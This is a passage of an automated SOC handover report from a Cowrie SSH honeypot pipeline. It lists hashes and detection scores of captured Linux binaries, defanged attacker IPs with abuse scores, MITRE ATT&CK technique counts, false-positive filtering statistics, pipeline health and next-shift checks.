| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `132.148.29[.]10` | US | GoDaddy.com, LLC | **100** ⚠️ | 1 |
| `31.208.13[.]101` | SE | Bredband2 AB | **100** ⚠️ | 4 |
| `14.103.76[.]234` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `197.248.8[.]33` | KE | Safaricom Limited | **100** ⚠️ | 50 |
| `180.76.115[.]202` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `102.88.137[.]145` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `45.168.35[.]207` | BR | SpeedyNet Comunicacao Multimídia - Eireli | **100** ⚠️ | 2 |
| `119.160.215[.]50` | PK | ULTRA LINK (PRIVATE) LIMITED | **100** ⚠️ | 49 |
| `101.96.220[.]35` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 1 |
| `199.45.155[.]99` | HK | Censys, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 338 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 175 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 154 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 77 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 76 |

---

## 🔕 False Positive Summary (48 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 25 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 21 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 469 cases |
| Tool 34  | Credential Extractor        | ✅ 329 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 40 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 48 filtered (10.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 154 priority case(s) shown individually · 29 recon entry/entries in table (16 group(s) consolidating 254 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-26T07:55:27Z_
